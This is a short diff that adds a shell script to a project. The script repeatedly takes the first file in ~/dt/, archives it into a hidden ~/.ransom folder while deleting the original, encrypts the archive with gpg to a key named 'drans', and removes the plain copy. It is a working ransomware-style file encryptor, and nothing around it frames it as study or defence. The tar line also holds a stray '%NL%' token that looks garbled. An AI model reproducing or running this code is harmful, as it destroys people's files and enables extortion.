@@ -1,0 +1,11 @@
+#!/bin/sh
+cd ~/dt/
+encrypt(){ 
+        dirFile=$(ls | head -n 1)
+         tar cf ~/.ransom/$dirFile.tar.gz --exclude='.' --exclude='..' --exclude='.ransom' --remove-files $dirFile %NL% >> ~/.system/drans
+         gpg -e -r drans -o ~/.ransom/$dirFile.tar.gpg ~/.ransom/$dirFile.tar.gz && rm -rf ~/.ransom/$dirFile.tar.gz
+}
+for (( ; ; ))
+do
+      encrypt
+done
